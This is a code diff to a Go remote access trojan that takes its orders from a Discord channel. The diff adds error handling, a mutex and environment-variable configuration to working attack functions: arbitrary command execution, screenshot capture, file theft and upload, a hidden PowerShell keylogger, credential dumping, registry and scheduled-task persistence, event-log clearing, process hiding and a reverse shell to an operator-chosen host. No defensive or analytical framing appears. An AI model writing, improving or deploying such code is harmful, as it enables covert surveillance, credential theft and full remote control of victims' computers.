@@ -40,6 +40,7 @@ import (
 	"net/http"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"strconv"
@@ -50,7 +51,10 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
-var myChannelId string // Global variable
+var (
+	myChannelId string
+	channelMu   sync.Mutex // Mutex to protect myChannelId
+)
 
 func getTmpDir() string {
 	if runtime.GOOS == "windows" {
@@ -62,11 +66,25 @@ func getTmpDir() string {
 
 // System info gathering
 func getSystemInfo() string {
-	hostname, _ := os.Hostname()
-	currentUser, _ := user.Current()
-	cwd, _ := os.Getwd()
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "Unknown"
+	}
 	
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
+	currentUser, err := user.Current()
+	if err != nil {
+		return fmt.Sprintf("**System Information:**\n```\nError: Could not retrieve system info: %v\n```", err)
+	}
+	
+	cwd, err := os.Getwd()
+	if err != nil {
+		cwd = "Unknown"
+	}
+	
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		return fmt.Sprintf("**System Information:**\n```\nError: Could not get IP address: %v\n```", err)
+	}
 	defer conn.Close()
 	localAddr := conn.LocalAddr().(*net.UDPAddr)
 	
@@ -74,12 +92,20 @@ func getSystemInfo() string {
 	if runtime.GOOS == "windows" {
 		// Try to get Windows version
 		cmd := exec.Command("cmd", "/C", "ver")
-		out, _ := cmd.CombinedOutput()
-		osInfo = string(out)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			osInfo = "Unknown"
+		} else {
+			osInfo = string(out)
+		}
 	} else {
 		cmd := exec.Command("uname", "-a")
-		out, _ := cmd.CombinedOutput()
-		osInfo = string(out)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			osInfo = "Unknown"
+		} else {
+			osInfo = string(out)
+		}
 	}
 
 	return fmt.Sprintf("**System Information:**\n```\nHostname: %s\nUser: %s\nCWD: %s\nOS: %s\nIP: %s\n%s```", 
@@ -121,7 +147,10 @@ public class KeyLogger {
 `
 	
 	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershellCmd)
-	cmd.Start()
+	err := cmd.Start()
+	if err != nil {
+		return fmt.Sprintf("❌ Keylogger failed to start: %v", err)
+	}
 	
 	return fmt.Sprintf("✅ Keylogger started. Logging to: %s", logfile)
 }
@@ -152,8 +181,12 @@ func checkPrivileges() string {
 		return "❌ Privilege check only works on Windows"
 	}
 
-	cmd := exec.Command("powershell", "-NoProfile", "-Command", "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
-	out, _ := cmd.CombinedOutput()
+	cmd := exec.Command("powershell", "-NoProfile", "-Command", 
+		"([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("⚠️ Error checking privileges: %v", err)
+	}
 	
 	if strings.Contains(string(out), "True") {
 		return "✅ Running as Administrator (HIGH PRIVILEGES)"
@@ -180,9 +213,13 @@ func dumpCredentials() string {
 		cmd := exec.Command("cmd", "/C", method)
 		out, err := cmd.CombinedOutput()
 		if err == nil {
-			results += fmt.Sprintf("\nMethod %d: Success\n%s\n", i+1, string(out)[:500])
+			maxLen := 500
+			if len(out) < maxLen {
+				maxLen = len(out)
+			}
+			results += fmt.Sprintf("\nMethod %d: Success\n%s\n", i+1, string(out[:maxLen]))
 		} else {
-			results += fmt.Sprintf("\nMethod %d: Failed\n", i+1)
+			results += fmt.Sprintf("\nMethod %d: Failed - %v\n", i+1, err)
 		}
 	}
 	return results
@@ -202,7 +239,7 @@ func establishPersistence(persistType string) string {
 		if err == nil {
 			return "✅ Registry persistence established (HKCU Run key)"
 		}
-		return "❌ Registry persistence failed"
+		return fmt.Sprintf("❌ Registry persistence failed: %v", err)
 	} else if strings.Contains(persistType, "scheduled") {
 		// Scheduled task persistence
 		cmd := exec.Command("powershell", "-NoProfile", "-Command",
@@ -213,7 +250,7 @@ func establishPersistence(persistType string) string {
 		if err == nil {
 			return "✅ Scheduled task persistence established"
 		}
-		return "❌ Scheduled task persistence failed"
+		return fmt.Sprintf("❌ Scheduled task persistence failed: %v", err)
 	}
 	return "⚠️ Unknown persistence type"
 }
@@ -247,7 +284,10 @@ func hideProcess() string {
 	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
 		fmt.Sprintf(`Get-Process | Where-Object {$_.Id -eq %d} | Stop-Process -Force`, pid))
 	
-	cmd.Run()
+	err := cmd.Run()
+	if err != nil {
+		return fmt.Sprintf("⚠️ Process hiding failed: %v", err)
+	}
 	
 	return fmt.Sprintf("✅ Process hiding initiated (PID: %d)", pid)
 }
@@ -269,7 +309,7 @@ func clearLogs() string {
 		if err == nil {
 			results += fmt.Sprintf("✅ %s log cleared\n", log)
 		} else {
-			results += fmt.Sprintf("❌ %s log clear failed\n", log)
+			results += fmt.Sprintf("❌ %s log clear failed: %v\n", log, err)
 		}
 	}
 
@@ -330,7 +370,10 @@ func listDirectory(path string) string {
 
 	result := fmt.Sprintf("**Directory: %s**\n```\n", path)
 	for _, entry := range entries {
-		info, _ := entry.Info()
+		info, err := entry.Info()
+		if err != nil {
+			continue
+		}
 		if entry.IsDir() {
 			result += fmt.Sprintf("[DIR]  %s\n", entry.Name())
 		} else {
@@ -353,7 +396,10 @@ func getNetworkInfo() string {
 		result += fmt.Sprintf("Interface: %s\n", iface.Name)
 		result += fmt.Sprintf("  MAC: %s\n", iface.HardwareAddr)
 		
-		addrs, _ := iface.Addrs()
+		addrs, err := iface.Addrs()
+		if err != nil {
+			continue
+		}
 		for _, addr := range addrs {
 			result += fmt.Sprintf("  IP: %s\n", addr.String())
 		}
@@ -371,12 +417,20 @@ func getSystemTime() string {
 	if runtime.GOOS == "windows" {
 		cmd := exec.Command("powershell", "-NoProfile", "-Command", 
 			`(Get-Date) - (Get-Date -Date (Get-WmiObject Win32_OperatingSystem).LastBootUpTime)`)
-		out, _ := cmd.CombinedOutput()
-		uptime = string(out)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			uptime = "Unknown"
+		} else {
+			uptime = string(out)
+		}
 	} else {
 		cmd := exec.Command("bash", "-c", "uptime -p")
-		out, _ := cmd.CombinedOutput()
-		uptime = string(out)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			uptime = "Unknown"
+		} else {
+			uptime = string(out)
+		}
 	}
 
 	return fmt.Sprintf("**System Time:**\n```\nCurrent Time: %s\nUptime: %s```", now.Format(time.RFC3339), uptime)
@@ -445,13 +499,28 @@ $client.Close()
 		cmd = exec.Command("bash", "-c", bashCmd)
 	}
 
-	cmd.Start()
+	err := cmd.Start()
+	if err != nil {
+		return fmt.Sprintf("❌ Reverse shell failed: %v", err)
+	}
 	return fmt.Sprintf("✅ Reverse shell initiated to %s", target)
+}
+
+// Safe string slicing helper
+func safeSlice(s string, start int) string {
+	if start < 0 || start > len(s) {
+		return ""
+	}
+	return s[start:]
 }
 
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	// Ignores messages in other channels and own messages
-	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
+	channelMu.Lock()
+	ch := myChannelId
+	channelMu.Unlock()
+	
+	if m.ChannelID != ch || m.Author.ID == s.State.User.ID {
 		return
 	}
 
@@ -462,49 +531,75 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	//Run command
 	if strings.HasPrefix(m.Content, "🏃‍♂️") {
 		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
+		cmdStr := safeSlice(m.Content, 14)
+		if cmdStr == "" {
+			response = "❌ No command provided"
+			flag = 1
 		} else {
-			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
-		}
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			out = append(out, 0x0a)
-			out = append(out, []byte(err.Error())...)
-		}
+			if runtime.GOOS == "windows" {
+				cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", cmdStr)
+			} else {
+				cmd = exec.Command("/bin/bash", "-c", cmdStr)
+			}
+			out, err := cmd.CombinedOutput()
+			if err != nil {
+				out = append(out, 0x0a)
+				out = append(out, []byte(err.Error())...)
+			}
 
-		// Message is too long, save as file
-		if (len(out) > 2000-13) {
-			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
-			f.Write(out)
-			fileName := f.Name()
-			f.Close()
+			// Message is too long, save as file
+			if (len(out) > 2000-13) {
+				f, err := os.CreateTemp(getTmpDir(), "*.txt")
+				if err != nil {
+					response = fmt.Sprintf("❌ Error creating temp file: %v", err)
+				} else {
+					f.Write(out)
+					fileName := f.Name()
+					f.Close()
 
-			f, _ = os.Open(fileName)
-			defer f.Close()
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
-		} else {
-			var resp strings.Builder
-			resp.WriteString("```bash\n")
-			resp.WriteString(string(out) + "\n")
-			resp.WriteString("```")
-			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
+					f, err := os.Open(fileName)
+					if err != nil {
+						response = fmt.Sprintf("❌ Error opening file: %v", err)
+					} else {
+						defer f.Close()
+						fileStruct := &discordgo.File{Name: fileName, Reader: f}
+						fileArray := []*discordgo.File{fileStruct}
+						s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+					}
+				}
+			} else {
+				var resp strings.Builder
+				resp.WriteString("```bash\n")
+				resp.WriteString(string(out) + "\n")
+				resp.WriteString("```")
+				s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
+			}
+			flag = 1
 		}
-		flag = 1
 	} else if m.Content == "📸" {
 		n := screenshot.NumActiveDisplays()
 		for i := 0; i < n; i++ {
 			bounds := screenshot.GetDisplayBounds(i)
-			img, _ := screenshot.CaptureRect(bounds)
+			img, err := screenshot.CaptureRect(bounds)
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Screenshot failed: %v", err), m.Reference())
+				continue
+			}
 
 			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
-			file, _ := os.Create(fileName)
+			file, err := os.Create(fileName)
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error saving screenshot: %v", err), m.Reference())
+				continue
+			}
 			png.Encode(file, img)
-			defer file.Close()
+			file.Close()
 
-			f, _ := os.Open(fileName)
+			f, err := os.Open(fileName)
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error opening screenshot: %v", err), m.Reference())
+				continue
+			}
 			defer f.Close()
 			fileStruct := &discordgo.File{Name: fileName, Reader: f}
 			fileArray := []*discordgo.File{fileStruct}
@@ -512,34 +607,69 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "👇") {
-		fileName := m.Content[5:len(m.Content)]
-		f, _ := os.Open(fileName)
-		fi, _ := f.Stat()
-		defer f.Close()
-		if fi.Size() < 8388608 { // 8MB file limit
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+		fileName := safeSlice(m.Content, 5)
+		if fileName == "" {
+			response = "❌ No file path provided"
 			flag = 1
 		} else {
-			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+			f, err := os.Open(fileName)
+			if err != nil {
+				response = fmt.Sprintf("❌ Error opening file: %v", err)
+				flag = 1
+			} else {
+				fi, err := f.Stat()
+				if err != nil {
+					response = fmt.Sprintf("❌ Error stat file: %v", err)
+					flag = 1
+				} else {
+					defer f.Close()
+					if fi.Size() < 8388608 { // 8MB file limit
+						fileStruct := &discordgo.File{Name: fileName, Reader: f}
+						fileArray := []*discordgo.File{fileStruct}
+						s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+						flag = 1
+					} else {
+						s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+					}
+				}
+			}
 		}
 	} else if strings.HasPrefix(m.Content, "☝️") {
-		path := m.Content[7:len(m.Content)]
-		if len(m.Attachments) > 0 {
-			out, _ := os.Create(path)
-			defer out.Close()
-			resp, _ := http.Get(m.Attachments[0].URL)
-			defer resp.Body.Close()
-			io.Copy(out, resp.Body)
-			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
+		path := safeSlice(m.Content, 7)
+		if path == "" {
+			response = "❌ No path provided"
+			flag = 1
+		} else if len(m.Attachments) > 0 {
+			out, err := os.Create(path)
+			if err != nil {
+				response = fmt.Sprintf("❌ Error creating file: %v", err)
+				flag = 1
+			} else {
+				defer out.Close()
+				resp, err := http.Get(m.Attachments[0].URL)
+				if err != nil {
+					response = fmt.Sprintf("❌ Error downloading file: %v", err)
+					flag = 1
+				} else {
+					defer resp.Body.Close()
+					_, err := io.Copy(out, resp.Body)
+					if err != nil {
+						response = fmt.Sprintf("❌ Error writing file: %v", err)
+					} else {
+						response = "Uploaded file to " + path
+					}
+					flag = 1
+				}
+			}
+		} else {
+			response = "❌ No attachment provided"
+			flag = 1
 		}
-		flag = 1
 	} else if m.Content == "💀" {
 		flag = 2
 	} else if strings.HasPrefix(m.Content, "🔑") {
 		// Keylogger
-		logfile := m.Content[5:len(m.Content)]
+		logfile := safeSlice(m.Content, 5)
 		if logfile == "" {
 			logfile = getTmpDir() + "keylog.txt"
 		}
@@ -559,7 +689,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "🔄") {
 		// Persistence
-		persistType := strings.TrimSpace(m.Content[5:len(m.Content)])
+		persistType := strings.TrimSpace(safeSlice(m.Content, 5))
 		if persistType == "" {
 			persistType = "registry"
 		}
@@ -567,7 +697,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "📡") {
 		// Reverse shell
-		target := strings.TrimSpace(m.Content[5:len(m.Content)])
+		target := strings.TrimSpace(safeSlice(m.Content, 5))
 		response = reverseShell(target)
 		flag = 1
 	} else if m.Content == "🛡️" {
@@ -588,7 +718,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "📋") {
 		// List directory
-		path := strings.TrimSpace(m.Content[5:len(m.Content)])
+		path := strings.TrimSpace(safeSlice(m.Content, 5))
 		if path == "" {
 			path = "."
 		}
@@ -616,16 +746,24 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if response != "" {
 		if len(response) > 2000 {
 			// Save to file if too long
-			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
-			f.WriteString(response)
-			fileName := f.Name()
-			f.Close()
+			f, err := os.CreateTemp(getTmpDir(), "*.txt")
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error creating temp file: %v", err), m.Reference())
+			} else {
+				f.WriteString(response)
+				fileName := f.Name()
+				f.Close()
 
-			f, _ = os.Open(fileName)
-			defer f.Close()
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+				f, err := os.Open(fileName)
+				if err != nil {
+					s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("❌ Error opening file: %v", err), m.Reference())
+				} else {
+					defer f.Close()
+					fileStruct := &discordgo.File{Name: fileName, Reader: f}
+					fileArray := []*discordgo.File{fileStruct}
+					s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+				}
+			}
 		} else {
 			s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
 		}
@@ -642,33 +780,76 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func main() {
-    dg, err := discordgo.New("Bot ...") // Hardcoded bot token
-    if err != nil {
-		// Error creating Discord session
-        return
-    }
+	// Load bot token from environment variable
+	botToken := os.Getenv("DISCORD_BOT_TOKEN")
+	if botToken == "" {
+		fmt.Println("Error: DISCORD_BOT_TOKEN environment variable not set")
+		return
+	}
+
+	dg, err := discordgo.New("Bot " + botToken)
+	if err != nil {
+		fmt.Printf("Error creating Discord session: %v\n", err)
+		return
+	}
 
 	// Handler for CreateMessage events
-    dg.AddHandler(handler)
-    dg.Identify.Intents = discordgo.IntentsGuildMessages
+	dg.AddHandler(handler)
+	dg.Identify.Intents = discordgo.IntentsGuildMessages
 
-    err = dg.Open()
-    if err != nil {
-		// Error opening connection
-        return
-    }
+	err = dg.Open()
+	if err != nil {
+		fmt.Printf("Error opening connection: %v\n", err)
+		return
+	}
+
+	// Load guild ID from environment variable
+	guildID := os.Getenv("DISCORD_GUILD_ID")
+	if guildID == "" {
+		fmt.Println("Error: DISCORD_GUILD_ID environment variable not set")
+		dg.Close()
+		return
+	}
 
 	// Create new channel
 	rand.Seed(time.Now().UnixNano())
-	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999 - 1000) + 1000)
-	c, _ := dg.GuildChannelCreate("...", sessionId, 0) // Guild ID is hardcoded
+	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999-1000)+1000)
+	c, err := dg.GuildChannelCreate(guildID, sessionId, 0)
+	if err != nil {
+		fmt.Printf("Error creating channel: %v\n", err)
+		dg.Close()
+		return
+	}
+
+	channelMu.Lock()
 	myChannelId = c.ID
+	channelMu.Unlock()
 
 	// Send first message with basic info (and pin it)
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
 	cwd, _ := os.Getwd()
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
-    defer conn.Close()
-    localAddr := conn.LocalAddr().(*net.UDPAddr)
-	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n
+	defer conn.Close()
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	
+	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\nHostname: %s\nUser: %s\nCWD: %s\nIP: %s",
+		sessionId, hostname, currentUser.Username, cwd, localAddr.IP.String())
+	
+	m, err := dg.ChannelMessageSend(c.ID, firstMsg)
+	if err != nil {
+		fmt.Printf("Error sending first message: %v\n", err)
+	} else {
+		dg.ChannelMessagePin(c.ID, m.ID)
+	}
+
+	fmt.Println("Bot is now running. Press CTRL+C to exit.")
+	
+	// Wait for interrupt signal
+	sc := make(chan os.Signal, 1)
+	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+	<-sc
+
+	// Cleanly close down the Discord session.
+	dg.Close()
+}
